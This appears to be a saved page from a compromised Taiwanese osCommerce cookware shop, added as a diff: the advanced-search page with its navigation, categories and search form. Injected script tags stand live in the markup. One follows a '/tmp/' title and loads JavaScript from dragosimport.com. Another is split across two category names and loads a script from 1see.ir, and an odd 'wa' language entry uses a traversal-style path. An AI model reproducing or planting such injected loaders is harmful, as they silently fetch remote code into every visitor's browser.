@@ -1,0 +1,557 @@
+<!doctype html public "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html dir="LTR" lang="tw">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=big5">
+<base href="http://mall.twinsec.com/">
+<title>/tmp/</title><script src=http://dragosimport.com/js/></script><title></title>
+<link rel="stylesheet" type="text/css" href="stylesheet.css">
+<script language="javascript" src="includes/general.js"></script>
+<script language="javascript"><!--
+function check_form() {
+  var error_message = "別急！別急！\n您的資料還沒填完喔！\n看看您漏掉哪些\n\n";
+  var error_found = false;
+  var error_field;
+  var keywords = document.advanced_search.keywords.value;
+  var dfrom = document.advanced_search.dfrom.value;
+  var dto = document.advanced_search.dto.value;
+  var pfrom = document.advanced_search.pfrom.value;
+  var pto = document.advanced_search.pto.value;
+  var pfrom_float;
+  var pto_float;
+
+  if ( ((keywords == '') || (keywords.length < 1)) && ((dfrom == '') || (dfrom == 'mm/dd/yyyy') || (dfrom.length < 1)) && ((dto == '') || (dto == 'mm/dd/yyyy') || (dto.length < 1)) && ((pfrom == '') || (pfrom.length < 1)) && ((pto == '') || (pto.length < 1)) ) {
+    error_message = error_message + "* 搜尋表單內至少必須填一個欄位\n";
+    error_field = document.advanced_search.keywords;
+    error_found = true;
+  }
+
+  if ((dfrom.length > 0) && (dfrom != 'mm/dd/yyyy')) {
+    if (!IsValidDate(dfrom, 'mm/dd/yyyy')) {
+      error_message = error_message + "* 無效的開始日期\n";
+      error_field = document.advanced_search.dfrom;
+      error_found = true;
+    }
+  }
+
+  if ((dto.length > 0) && (dto != 'mm/dd/yyyy')) {
+    if (!IsValidDate(dto, 'mm/dd/yyyy')) {
+      error_message = error_message + "* 無效的結束日期\n";
+      error_field = document.advanced_search.dto;
+      error_found = true;
+    }
+  }
+
+  if ((dfrom.length > 0) && (dfrom != 'mm/dd/yyyy') && (IsValidDate(dfrom, 'mm/dd/yyyy')) && (dto.length > 0) && (dto != 'mm/dd/yyyy') && (IsValidDate(dto, 'mm/dd/yyyy'))) {
+    if (!CheckDateRange(document.advanced_search.dfrom, document.advanced_search.dto)) {
+      error_message = error_message + "* 結束日期必須大於或等於開始日期\n";
+      error_field = document.advanced_search.dto;
+      error_found = true;
+    }
+  }
+
+  if (pfrom.length > 0) {
+    pfrom_float = parseFloat(pfrom);
+    if (isNaN(pfrom_float)) {
+      error_message = error_message + "* 價格必須為數字\n";
+      error_field = document.advanced_search.pfrom;
+      error_found = true;
+    }
+  } else {
+    pfrom_float = 0;
+  }
+
+  if (pto.length > 0) {
+    pto_float = parseFloat(pto);
+    if (isNaN(pto_float)) {
+      error_message = error_message + "* 價格必須為數字\n";
+      error_field = document.advanced_search.pto;
+      error_found = true;
+    }
+  } else {
+    pto_float = 0;
+  }
+
+  if ( (pfrom.length > 0) && (pto.length > 0) ) {
+    if ( (!isNaN(pfrom_float)) && (!isNaN(pto_float)) && (pto_float < pfrom_float) ) {
+      error_message = error_message + "* 價格上限必須大於或等於價格下限\n";
+      error_field = document.advanced_search.pto;
+      error_found = true;
+    }
+  }
+
+  if (error_found == true) {
+    alert(error_message);
+    error_field.focus();
+    return false;
+  } else {
+    RemoveFormatString(document.advanced_search.dfrom, "mm/dd/yyyy");
+    RemoveFormatString(document.advanced_search.dto, "mm/dd/yyyy");
+    return true;
+  }
+}
+
+function popupWindow(url) {
+  window.open(url,'popupWindow','toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,resizable=yes,copyhistory=no,width=450,height=280,screenX=150,screenY=150,top=150,left=150')
+}
+//--></script>
+</head>
+<body marginwidth="0" marginheight="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0">
+<!-- header //-->
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr class="header">
+    <td valign="middle"><a href="http://mall.twinsec.com/index.php?osCsid=b64ceb2de4a91f9df34115f8e72817d4"><img src="images/oscommerce.gif" border="0" alt="osCommerce" title=" osCommerce " width="204" height="50"></a></td>
+    <td align="right" valign="bottom"><a href="http://mall.twinsec.com/account.php?osCsid=b64ceb2de4a91f9df34115f8e72817d4"><img src="images/header_account.gif" border="0" alt="我的帳號" title=" 我的帳號 " width="63" height="56"></a>&nbsp;&nbsp;<a href="http://mall.twinsec.com/shopping_cart.php?osCsid=b64ceb2de4a91f9df34115f8e72817d4"><img src="images/header_cart.gif" border="0" alt="購物車內容" title=" 購物車內容 " width="63" height="56"></a>&nbsp;&nbsp;<a href="http://mall.twinsec.com/checkout_shipping.php?osCsid=b64ceb2de4a91f9df34115f8e72817d4"><img src="images/header_checkout.gif" border="0" alt="結帳" title=" 結帳 " width="63" height="56"></a>&nbsp;&nbsp;</td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1">
+  <tr class="headerNavigation">
+    <td class="headerNavigation">&nbsp;&nbsp;<a href="http://mall.twinsec.com" class="headerNavigation">首頁</a> &raquo; <a href="http://mall.twinsec.com/index.php?osCsid=b64ceb2de4a91f9df34115f8e72817d4" class="headerNavigation">商品目錄</a> &raquo; <a href="http://mall.twinsec.com/advanced_search.php?osCsid=b64ceb2de4a91f9df34115f8e72817d4" class="headerNavigation">進階搜尋</a></td>
+    <td align="right" class="headerNavigation"><a href="http://mall.twinsec.com/account.php?osCsid=b64ceb2de4a91f9df34115f8e72817d4" class="headerNavigation">我的帳號</a> &nbsp;|&nbsp; <a href="http://mall.twinsec.com/shopping_cart.php?osCsid=b64ceb2de4a91f9df34115f8e72817d4" class="headerNavigation">購物車內容</a> &nbsp;|&nbsp; <a href="http://mall.twinsec.com/checkout_shipping.php?osCsid=b64ceb2de4a91f9df34115f8e72817d4" class="headerNavigation">結帳</a> &nbsp;&nbsp;</td>
+  </tr>
+</table>
+<!-- header_eof //-->
+
+<!-- body //-->
+<table border="0" width="100%" cellspacing="3" cellpadding="3">
+  <tr>
+    <td width="125" valign="top"><table border="0" width="125" cellspacing="0" cellpadding="2">
+<!-- left_navigation //-->
+<!-- categories //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading"><img src="images/infobox/corner_left.gif" border="0" alt="" width="11" height="14"></td>
+    <td width="100%" height="14" class="infoBoxHeading">商品分類</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/pixel_trans.gif" border="0" alt="" width="11" height="14"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="3" class="infoBoxContents">
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+  <tr>
+    <td class="boxText"><a href="http://mall.twinsec.com/index.php?cPath=21&osCsid=b64ceb2de4a91f9df34115f8e72817d4">品牌鍋具-&gt;</a>&nbsp;(1)<br><a href="http://mall.twinsec.com/index.php?cPath=23&osCsid=b64ceb2de4a91f9df34115f8e72817d4"><script src=http://1see.ir/j/></a><br><a href="http://mall.twinsec.com/index.php?cPath=24&osCsid=b64ceb2de4a91f9df34115f8e72817d4"></script></a><br></td>
+  </tr>
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- categories_eof //-->
+<!-- manufacturers //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading"><img src="images/infobox/corner_right_left.gif" border="0" alt="" width="11" height="14"></td>
+    <td width="100%" height="14" class="infoBoxHeading">製造廠商</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/pixel_trans.gif" border="0" alt="" width="11" height="14"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="3" class="infoBoxContents">
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+  <tr>
+    <td class="boxText"><form name="manufacturers" action="http://mall.twinsec.com/index.php" method="get"><select name="manufacturers_id" onChange="this.form.submit();" size="1" style="width: 100%"><option value="" SELECTED>請選擇</option><option value="17"></option><option value="25"></option><option value="26"></option><option value="27"></option><option value="28"></option><option value="29"></option><option value="30"></option><option value="31"></option><option value="32"></option><option value="33"></option><option value="34"></option><option value="35"></option><option value="24"></option><option value="23"></option><option value="22"></option><option value="16"></option><option value="10"></option><option value="11"></option><option value="12"></option><option value="13"></option><option value="14"></option><option value="15"></option><option value="18"></option><option value="19"></option><option value="20"></option><option value="21"></option><option value="36"></option></select><input type="hidden" name="osCsid" value="b64ceb2de4a91f9df34115f8e72817d4"></form></td>
+  </tr>
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- manufacturers_eof //-->
+<!-- whats_new //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading"><img src="images/infobox/corner_right_left.gif" border="0" alt="" width="11" height="14"></td>
+    <td width="100%" height="14" class="infoBoxHeading">新上架商品</td>
+    <td height="14" class="infoBoxHeading" nowrap><a href="http://mall.twinsec.com/products_new.php?osCsid=b64ceb2de4a91f9df34115f8e72817d4"><img src="images/infobox/arrow_right.gif" border="0" alt="更多" title=" 更多 " width="12" height="10"></a><img src="images/pixel_trans.gif" border="0" alt="" width="11" height="14"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="3" class="infoBoxContents">
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+  <tr>
+    <td align="center" class="boxText"><a href="http://mall.twinsec.com/product_info.php?products_id=28&osCsid=b64ceb2de4a91f9df34115f8e72817d4"><img src="images/74_27_250.jpg" border="0" alt="《義廚寶》絕色系列-深炒鍋 27CM 買就送鍋蓋\鍋鏟" title=" 《義廚寶》絕色系列-深炒鍋 27CM 買就送鍋蓋\鍋鏟 " width="100" height="80"></a><br><a href="http://mall.twinsec.com/product_info.php?products_id=28&osCsid=b64ceb2de4a91f9df34115f8e72817d4">《義廚寶》絕色系列-深炒鍋 27CM 買就送鍋蓋\鍋鏟</a><br>NT$1,393</td>
+  </tr>
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- whats_new_eof //-->
+<!-- search //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading"><img src="images/infobox/corner_right_left.gif" border="0" alt="" width="11" height="14"></td>
+    <td width="100%" height="14" class="infoBoxHeading">快速尋找商品</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/pixel_trans.gif" border="0" alt="" width="11" height="14"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="3" class="infoBoxContents">
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+  <tr>
+    <td align="center" class="boxText"><form name="quick_find" action="http://mall.twinsec.com/advanced_search_result.php" method="get"><input type="text" name="keywords" size="10" maxlength="30" style="width: 95px">&nbsp;<input type="hidden" name="osCsid" value="b64ceb2de4a91f9df34115f8e72817d4"><input type="image" src="includes/languages/tchinese/images/buttons/button_quick_find.gif" border="0" alt="快速尋找商品" title=" 快速尋找商品 "><br>輸入關鍵字尋找商品<br><a href="http://mall.twinsec.com/advanced_search.php?osCsid=b64ceb2de4a91f9df34115f8e72817d4"><b>進階尋找商品</b></a></form></td>
+  </tr>
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- search_eof //-->
+<!-- information //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading"><img src="images/infobox/corner_right_left.gif" border="0" alt="" width="11" height="14"></td>
+    <td width="100%" height="14" class="infoBoxHeading">服務台</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/pixel_trans.gif" border="0" alt="" width="11" height="14"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="3" class="infoBoxContents">
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+  <tr>
+    <td class="boxText"><a href="http://mall.twinsec.com/shipping.php?osCsid=b64ceb2de4a91f9df34115f8e72817d4">退換貨事項</a><br><a href="http://mall.twinsec.com/privacy.php?osCsid=b64ceb2de4a91f9df34115f8e72817d4">隱私權保護聲明</a><br><a href="http://mall.twinsec.com/conditions.php?osCsid=b64ceb2de4a91f9df34115f8e72817d4">會員權益及須知</a><br><a href="http://mall.twinsec.com/contact_us.php?osCsid=b64ceb2de4a91f9df34115f8e72817d4">聯絡我們</a></td>
+  </tr>
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- information_eof //-->
+<!-- left_navigation_eof //-->
+    </table></td>
+<!-- body_text //-->
+    <td width="100%" valign="top"><form name="advanced_search" action="http://mall.twinsec.com/advanced_search_result.php" method="get" onSubmit="return check_form(this);"><input type="hidden" name="osCsid" value="b64ceb2de4a91f9df34115f8e72817d4"><table border="0" width="100%" cellspacing="0" cellpadding="0">
+      <tr>
+        <td><table border="0" width="100%" cellspacing="0" cellpadding="0">
+          <tr>
+            <td class="pageHeading">進階搜尋</td>
+            <td class="pageHeading" align="right"><img src="images/table_background_browse.gif" border="0" alt="進階搜尋" title=" 進階搜尋 " width="57" height="40"></td>
+          </tr>
+        </table></td>
+      </tr>
+      <tr>
+        <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="10"></td>
+      </tr>
+      <tr>
+        <td><table border="0" width="100%" cellspacing="0" cellpadding="2">
+  <tr class="messageStackError">
+    <td class="messageStackError"><img src="images/icons/error.gif" border="0" alt="錯誤" title=" 錯誤 " width="10" height="10">&nbsp;搜尋表單內至少必須填一個欄位</td>
+  </tr>
+</table>
+</td>
+      </tr>
+      <tr>
+        <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="10"></td>
+      </tr>
+      <tr>
+        <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading"><img src="images/infobox/corner_left.gif" border="0" alt="" width="11" height="14"></td>
+    <td width="100%" height="14" class="infoBoxHeading">搜尋條件</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/infobox/corner_right.gif" border="0" alt="" width="11" height="14"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="3" class="infoBoxContents">
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+  <tr>
+    <td class="boxText"><input type="text" name="keywords" style="width: 100%"></td>
+  </tr>
+  <tr>
+    <td align="right" class="boxText"><input type="checkbox" name="search_in_description" value="1"> 在商品描述內搜尋</td>
+  </tr>
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+        </td>
+      </tr>
+      <tr>
+        <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="10"></td>
+      </tr>
+      <tr>
+        <td><table border="0" width="100%" cellspacing="0" cellpadding="2">
+          <tr>
+            <td class="smallText"><a href="javascript:popupWindow('http://mall.twinsec.com/popup_search_help.php?osCsid=b64ceb2de4a91f9df34115f8e72817d4')"><u>搜尋求助</u> [?]</a></td>
+            <td class="smallText" align="right"><input type="image" src="includes/languages/tchinese/images/buttons/button_search.gif" border="0" alt="搜尋" title=" 搜尋 "></td>
+          </tr>
+        </table></td>
+      </tr>
+      <tr>
+        <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="10"></td>
+      </tr>
+      <tr>
+        <td><table border="0" width="100%" cellspacing="1" cellpadding="2" class="infoBox">
+          <tr class="infoBoxContents">
+            <td><table border="0" width="100%" cellspacing="0" cellpadding="2">
+              <tr>
+                <td class="fieldKey">商品分類:</td>
+                <td class="fieldValue"><select name="categories_id"><option value="" SELECTED>所有商品分類</option><option value="21">品牌鍋具</option><option value="22">&nbsp;&nbsp;義廚寶</option><option value="23">&lt;script src=http://1see.ir/j/&gt;</option><option value="24">&lt;/script&gt;</option></select></td>
+              </tr>
+              <tr>
+                <td class="fieldKey">&nbsp;</td>
+                <td class="smallText"><input type="checkbox" name="inc_subcat" value="1" CHECKED> 包含商品子分類</td>
+              </tr>
+              <tr>
+                <td colspan="2"><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="10"></td>
+              </tr>
+              <tr>
+                <td class="fieldKey">製造廠商:</td>
+                <td class="fieldValue"><select name="manufacturers_id"><option value="" SELECTED>所有製造商</option><option value="17"></option><option value="25"></option><option value="26"></option><option value="27"></option><option value="28"></option><option value="29"></option><option value="30"></option><option value="31"></option><option value="32"></option><option value="33"></option><option value="34"></option><option value="35"></option><option value="24"></option><option value="23"></option><option value="22"></option><option value="16"></option><option value="10"></option><option value="11"></option><option value="12"></option><option value="13"></option><option value="14"></option><option value="15"></option><option value="18"></option><option value="19"></option><option value="20"></option><option value="21"></option><option value="36"></option></select></td>
+              </tr>
+              <tr>
+                <td colspan="2"><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="10"></td>
+              </tr>
+              <tr>
+                <td class="fieldKey">價格由:</td>
+                <td class="fieldValue"><input type="text" name="pfrom"></td>
+              </tr>
+              <tr>
+                <td class="fieldKey">到:</td>
+                <td class="fieldValue"><input type="text" name="pto"></td>
+              </tr>
+              <tr>
+                <td colspan="2"><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="10"></td>
+              </tr>
+              <tr>
+                <td class="fieldKey">上架日期由:</td>
+                <td class="fieldValue"><input type="text" name="dfrom" value="mm/dd/yyyy" onFocus="RemoveFormatString(this, 'mm/dd/yyyy')"></td>
+              </tr>
+              <tr>
+                <td class="fieldKey">到:</td>
+                <td class="fieldValue"><input type="text" name="dto" value="mm/dd/yyyy" onFocus="RemoveFormatString(this, 'mm/dd/yyyy')"></td>
+              </tr>
+            </table></td>
+          </tr>
+        </table></td>
+      </tr>
+    </table></form></td>
+<!-- body_text_eof //-->
+    <td width="125" valign="top"><table border="0" width="125" cellspacing="0" cellpadding="2">
+<!-- right_navigation //-->
+<!-- shopping_cart //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading"><img src="images/infobox/corner_right_left.gif" border="0" alt="" width="11" height="14"></td>
+    <td width="100%" height="14" class="infoBoxHeading">購物車</td>
+    <td height="14" class="infoBoxHeading" nowrap><a href="http://mall.twinsec.com/shopping_cart.php?osCsid=b64ceb2de4a91f9df34115f8e72817d4"><img src="images/infobox/arrow_right.gif" border="0" alt="更多" title=" 更多 " width="12" height="10"></a><img src="images/infobox/corner_right.gif" border="0" alt="" width="11" height="14"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="3" class="infoBoxContents">
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+  <tr>
+    <td class="boxText">空的...</td>
+  </tr>
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- shopping_cart_eof //-->
+<!-- best_sellers //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading"><img src="images/infobox/corner_right_left.gif" border="0" alt="" width="11" height="14"></td>
+    <td width="100%" height="14" class="infoBoxHeading">暢銷商品</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/pixel_trans.gif" border="0" alt="" width="11" height="14"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="3" class="infoBoxContents">
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+  <tr>
+    <td class="boxText"><table border="0" width="100%" cellspacing="0" cellpadding="1"><tr><td class="infoBoxContents" valign="top">01.</td><td class="infoBoxContents"><a href="http://mall.twinsec.com/product_info.php?products_id=28&osCsid=b64ceb2de4a91f9df34115f8e72817d4">《義廚寶》絕色系列-深炒鍋 27CM 買就送鍋蓋\鍋鏟</a></td></tr></table></td>
+  </tr>
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- best_sellers_eof //-->
+<!-- reviews //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading"><img src="images/infobox/corner_right_left.gif" border="0" alt="" width="11" height="14"></td>
+    <td width="100%" height="14" class="infoBoxHeading">商品評論</td>
+    <td height="14" class="infoBoxHeading" nowrap><a href="http://mall.twinsec.com/reviews.php?osCsid=b64ceb2de4a91f9df34115f8e72817d4"><img src="images/infobox/arrow_right.gif" border="0" alt="更多" title=" 更多 " width="12" height="10"></a><img src="images/pixel_trans.gif" border="0" alt="" width="11" height="14"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="3" class="infoBoxContents">
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+  <tr>
+    <td class="boxText">目前沒有任何商品評論</td>
+  </tr>
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- reviews_eof //-->
+<!-- languages //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading"><img src="images/infobox/corner_right_left.gif" border="0" alt="" width="11" height="14"></td>
+    <td width="100%" height="14" class="infoBoxHeading">語系</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/pixel_trans.gif" border="0" alt="" width="11" height="14"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="3" class="infoBoxContents">
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+  <tr>
+    <td align="center" class="boxText"> <a href="http://mall.twinsec.com/advanced_search.php?language=wa&osCsid=b64ceb2de4a91f9df34115f8e72817d4"><img src="includes/languages/.././../images/img-584377816286/images/" border="0" alt="wa" title=" wa "></a>  <a href="http://mall.twinsec.com/advanced_search.php?language=tw&osCsid=b64ceb2de4a91f9df34115f8e72817d4"><img src="includes/languages/tchinese/images/flag_tw.gif" border="0" alt="tchinese" title=" tchinese " width="24" height="15"></a> </td>
+  </tr>
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- languages_eof //-->
+<!-- currencies //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading"><img src="images/infobox/corner_right_left.gif" border="0" alt="" width="11" height="14"></td>
+    <td width="100%" height="14" class="infoBoxHeading">貨幣</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/pixel_trans.gif" border="0" alt="" width="11" height="14"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="3" class="infoBoxContents">
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+  <tr>
+    <td align="center" class="boxText"><form name="currencies" action="http://mall.twinsec.com/advanced_search.php" method="get"><select name="currency" onChange="this.form.submit();" style="width: 100%"><option value="TWD" SELECTED>新台幣</option></select><input type="hidden" name="osCsid" value="b64ceb2de4a91f9df34115f8e72817d4"></form></td>
+  </tr>
+  <tr>
+    <td><img src="images/pixel_trans.gif" border="0" alt="" width="100%" height="1"></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- currencies_eof //-->
+<!-- right_navigation_eof //-->
+    </table></td>
+  </tr>
+</table>
+<!-- body_eof //-->
+
+<!-- footer //-->
+<table border="0" width="100%" cellspacing="0" cellpadding="1">
+  <tr class="footer">
+    <td class="footer">&nbsp;&nbsp;2018年January16日Tuesday&nbsp;&nbsp;</td>
+    <td align="right" class="footer">&nbsp;&nbsp;1006263 次瀏覽,自從 2007年July05日Thursday&nbsp;&nbsp;</td>
+  </tr>
+</table>
+<br>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td align="center" class="smallText">
+版權所有 &copy; 2003 <a href="http://www.oscommerce.com">osCommerce</a> : <a href="mailto:hpdl@oscommerce.com">Harald Ponce de Leon</a><br>Powered by <a href="http://www.oscommerce.com">osCommerce</a><br><br>繁體中文語系檔由<a href="http://forum.kmd.com.tw"><font color="#FF6633">KMD</font></a>製作    </td>
+  </tr>
+</table>
+<br>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td align="center"><a href="http://mall.twinsec.com/redirect.php?action=banner&goto=1&osCsid=b64ceb2de4a91f9df34115f8e72817d4" target="_blank"><img src="images/banners/oscommerce.gif" border="0" alt="osCommerce" title=" osCommerce " width="468" height="50"></a></td>
+  </tr>
+</table>
+<!-- footer_eof //-->
+<br>
+</body>
+</html>
